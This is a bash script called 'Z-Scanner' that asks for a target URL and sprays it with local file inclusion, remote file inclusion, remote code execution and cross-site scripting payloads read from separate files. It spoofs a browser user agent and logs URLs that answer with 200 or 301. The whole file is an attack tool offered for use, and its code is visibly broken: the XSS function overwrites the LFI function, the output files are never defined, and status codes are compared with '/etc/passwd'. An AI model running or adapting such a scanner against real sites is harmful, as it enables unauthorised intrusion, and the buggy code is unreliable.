#!/bin/sh
mkdir Files
cp lfi-payloads /$HOME/Z-Scanner/Files
cp rfi-payloads /$HOME/Z-Scanner/Files
cp rce-payloads /$HOME/Z-Scanner/Files
cp xss-payloads/$HOME/Z-Scanner/Files
clear

# color
f=3 b=4s
for j in f b; do
  for i in {0..7}; do
    printf -v $j$i %b "\e[${!j}${i}m"
  done
done

time=`date +"%T"`

useragents="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0"
echo "${f3}"
figlet -f big Z-Scanner
echo ""
echo "${f3}Author     : ${f7}Ali ElHafeth"
echo "${f3}Team       : ${f7}Zer0day Sudan"
echo "${f3}Alert : ${f7}I am not responsible for using the tool incorrectly"



# menu
echo ""
echo "${f2}[ ${f1}z-scann menu ${f2}]"
echo ""
echo "   ${f2}[${f1}1${f2}] ${f7}Local File Include"
echo "   ${f2}[${f1}2${f2}] ${f7}Remote File Include"
echo "   ${f2}[${f1}3${f2}] ${f7}Remote Code execution"
echo "   ${f2}[${f1}4${f2}] ${f7}Cross Site Scripting"
echo ""
echo -e ${f6}"┌─[${f1}zscanner${f6}]"
read -p "└─────► " zscann;
echo "${f1}Ex: ${f7}http://targeturl.com"
read -p "${f2}[${f1}*${f2}]${f1} Enter URL${f2}|-> "  urlz;
read -p "${f2}[${f1}*${f2}]${f1} Enter Threads${f2}|-> " thread;


#################################

######
con=1
######

##########
miring=/
##########


######################### Func Curl ############################################
# func lfi
lfi(){
	scan=$(curl -s -A '${useragents}' -o /dev/null -w '%{http_code}' ${urlz}${miring}${zlfi})
	if [[ $scan == 200 ]] || [[ $scan == 301 ]] || [[ $scan =~ "/etc/passwd" ]]; then
		echo "${f2}[${f3}$time${f2}] $urlz$miring$zlfi ~> ${f6}[${f7}OK${f6}]${f2}"
		echo "$urlz$miring$zlfi" >> $save1
	elif [[ $scan =~ "/bin/bash" ]]; then
			echo "${f2}[${f3}$time${f2}] $urlz$miring$zlfi ~> ${f6}[${f3}OK${f6}]${f2}"
			echo "$urlz$miring$zlfi" >> $save1
		else
			echo "${f2}[${f3}$time${f2}] $urlz$miring$zlfi ~> ${f6}[${f1}FAIL${f6}]${f2}"
	fi
}

# func rfi
rfi(){
	scan2=$(curl -s -A '${useragents}' -o /dev/null -w '%{http_code}' ${urlz}${miring}${zrfi})
	if [[ $scan2 == 200 ]] || [[ $scan2 == 301 ]] || [[ $scan2 =~ "/etc/passwd" ]]; then
		echo "${f2}[${f3}$time${f2}] $urlz$miring$zrfi ~> ${f6}[${f7}OK${f6}]${f2}"
		echo "$urlz$miring$zrfi" >> $save2
	else
		echo "${f2}[${f3}$time${f2}] $urlz$miring$zrfi ~> ${f6}[${f1}FAIL${f6}]${f2}"
	fi
	
}

# func rce
rce(){
	scan3=$(curl -s -A '${useragents}' -o /dev/null -w '%{http_code}' ${urlz}${miring}${zrce})
	if [[ $scan3 == 200 ]] || [[ $scan3 == 301 ]] || [[ $scan3 =~ "/etc/passwd" ]]; then
		echo "${f2}[${f3}$time${f2}] $urlz$miring$zrce ~> ${f6}[${f7}OK${f6}]${f2}"
		echo "$urlz$miring$zrce" >> $save3
	elif [[ $scan3 =~ "/etc/passwd" ]]; then
			echo "${f2}[${f3}$time${f2}] $urlz$miring$zrce ~> ${f6}[${f7}OK${f6}]${f2}"
			echo "$urlz$miring$zrce" >> $save3
		else
			echo "{f2}[${f3}$time${f2}] $urlz$miring$zrce ~> ${f6}[${f1}FAIL${f6}]${f2}"
	fi
	
}
# func xss
lfi(){
	scan4=$(curl -s -A '${useragents}' -o /dev/null -w '%{http_code}' ${urlz}${miring}${zxss})
	if [[ $scan4 == 200 ]] || [[ $scan4 == 301 ]] || [[ $scan4 =~ "/etc/passwd" ]]; then
		echo "${f2}[${f3}$time${f2}] $urlz$miring$zlfi ~> ${f6}[${f7}OK${f6}]${f2}"
		echo "$urlz$miring$zxss" >> $save1
	elif [[ $scan4 =~ "/bin/bash" ]]; then
			echo "${f2}[${f3}$time${f2}] $urlz$miring$zxss ~> ${f6}[${f3}OK${f6}]${f2}"
			echo "$urlz$miring$zxss" >> $save1
		else
			echo "${f2}[${f3}$time${f2}] $urlz$miring$zxss ~> ${f6}[${f1}FAIL${f6}]${f2}"
	fi
}
############################################################################




###################### LIST ######################
ceklistlfi(){
listlfi=$(wc -l Files/lfi-payloads | cut -f1 -d '')
echo "[ + ] Trying Local File Include Payloads ~> $listlfi"
sleep 2.0;
}

ceklistrfi(){
listrfi=$(wc -l Files/rfi-payloads | cut -f1 -d '')
echo "[ + ] Trying Remote File Include Payloads ~> $listrce"
sleep 2.0;
}

ceklistrce(){
listrce=$(wc -l Files/rce-payloads | cut -f1 -d '')
echo "[ + ] Trying Remote Code execution Payloads~> $listrce"
}
ceklistxss(){
listlfi=$(wc -l Files/xss-payloads | cut -f1 -d '')
echo "[ + ] Trying Cross Site Scripting Payloads ~> $listlfi"
sleep 2.0;
}
#################################################


############ Ekse (LFI) ####################
luplfi(){
for zlfi in $(cat $HOME/Z-Scanner/Files/lfi-payloads)
do
	fast=$(expr $con % $thread)
	if [[ $fast == 0 && $con > 0 ]]; then
		sleep 3
	fi
	lfi & 
	con=$[$con+1]
done
}
############################################


############ Ekse (RFI) ####################
luprfi(){
for zrfi in $(cat $HOME/Z-Scanner/Files/rfi-payloads)
do
	fast=$(expr $con % $thread)
	if [[ $fast == 0 && $con > 0 ]]; then
		sleep 3
	fi
	rfi & 
	con=$[$con+1]
done
cat $save2
}
############################################
############ Ekse (RCE) ####################
luprce(){
for zrce in $(cat $HOME/Z-Scanner/Files/rce-payloads)
do
	fast=$(expr $con % $thread)
	if [[ $fast == 0 && $con > 0 ]]; then
		sleep 3
	fi
	rce & 
	con=$[$con+1]
done
}
lupxss(){
for zxss in $(cat $HOME/Z-Scanner/Files/xss-payloads)
do
	fast=$(expr $con % $thread)
	if [[ $fast == 0 && $con > 0 ]]; then
		sleep 3
	fi
	xss & 
	con=$[$con+1]
done
}
############## Condition #################
if [[ $zscann == 1 ]]; then
	echo "${f2}[${f1}!${f2}] Scanning on ${f7}LFI ${f2}..."
	sleep 2
	ceklistlfi
	sleep 1
	luplfi
elif [[ $zscann == 2 ]]; then
	echo "${f2}[${f1}!${f2}] Scanning on ${f7}RFI ${f2}..."
	sleep 2
	ceklistrfi
	sleep 1
	luprfi
elif [[ $zscann == 3 ]]; then
        luprce
	echo "${f2}[${f1}!${f2}] Scanning on ${f7}RCE ${f2}..."
	sleep 2
	ceklistrce
	sleep 1
        luprce
        elif [[ $zscann == 4 ]]; then
        lupxss
	echo "${f2}[${f1}!${f2}] Scanning on ${f7}XSS ${f2}..."
	sleep 2
	ceklistxss
	sleep 1
        lupxss
    else                                                                
echo "${f2}[${f1}X${f2}]${f4} Wrong Command!"       
fi

